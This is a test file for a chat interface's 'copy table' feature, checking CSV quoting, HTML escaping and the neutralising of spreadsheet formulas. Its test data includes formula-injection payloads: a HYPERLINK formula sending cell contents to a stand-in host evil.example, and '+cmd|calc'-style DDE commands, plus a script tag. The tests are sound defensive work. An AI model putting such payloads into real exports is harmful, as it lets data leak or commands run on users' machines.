import { test } from 'node:test';
import assert from 'node:assert/strict';
import Papa from 'papaparse';
import { FORMULA_START, gridToCsv, gridToHtml, normalizeGrid } from '../ui/src/shell/tableCopy.js';

/** "Kopieer tabel" under a table in a chat answer (parity 4.6): CSV and an HTML table for Excel/Sheets. */

test('table copy: CSV quotes commas, quotes and line breaks and reads back to the same cells', () => {
  const grid = normalizeGrid([
    ['Product', 'Prijs', 'Opmerking'],
    ['Koffie, zwart', '2,50', 'zegt "lekker"'],
    ['Thee', '1,80', 'regel 1\nregel 2'],
  ]);
  const csv = gridToCsv(grid);
  assert.equal(csv.split('\r\n')[0], 'Product,Prijs,Opmerking');
  assert.match(csv, /"Koffie, zwart","2,50","zegt ""lekker"""/);
  assert.match(csv, /"regel 1\nregel 2"/);
  assert.deepEqual(Papa.parse<string[]>(csv, { newline: '\r\n' }).data, grid);
});

test('table copy: short rows are padded, spaces trimmed, empty trailing rows dropped', () => {
  const grid = normalizeGrid([
    ['a', 'b', 'c'],
    ['  1 ', '2'],
    ['', '', ''],
  ]);
  assert.deepEqual(grid, [
    ['a', 'b', 'c'],
    ['1', '2', ''],
  ]);
});

test('table copy: formulas from an untrusted answer are neutralised, signed numbers stay numbers', () => {
  for (const f of ['=HYPERLINK("http://x")', '@SUM(A1)', '+cmd|calc', '-2+3+cmd|x', '\tx']) assert.ok(FORMULA_START.test(f), f);
  for (const n of ['-5', '+3,5', '-12.5 %', 'gewoon tekst', '5-3', '']) assert.ok(!FORMULA_START.test(n), n);
  const csv = gridToCsv([['Link'], ['=HYPERLINK("http://evil.example/?"&A1)'], ['-5']]);
  assert.match(csv, /"'=HYPERLINK\(""http:\/\/evil\.example\/\?""&A1\)"/);
  assert.match(csv, /\r\n-5$/);
  const html = gridToHtml([['Link'], ['=1+1'], ['-5']]);
  assert.match(html, /<td>'=1\+1<\/td>/);
  assert.match(html, /<td>-5<\/td>/);
});

test('table copy: the HTML table escapes markup, keeps line breaks and has the first row as header', () => {
  const html = gridToHtml([
    ['Naam', 'Notitie'],
    ['<script>x</script>', 'a & b\nc'],
  ]);
  assert.match(html, /^<meta charset="utf-8"><table><thead><tr><th>Naam<\/th><th>Notitie<\/th><\/tr><\/thead>/);
  assert.match(html, /<td>&lt;script&gt;x&lt;\/script&gt;<\/td><td>a &amp; b<br>c<\/td>/);
  assert.ok(!html.includes('<script>'));
});
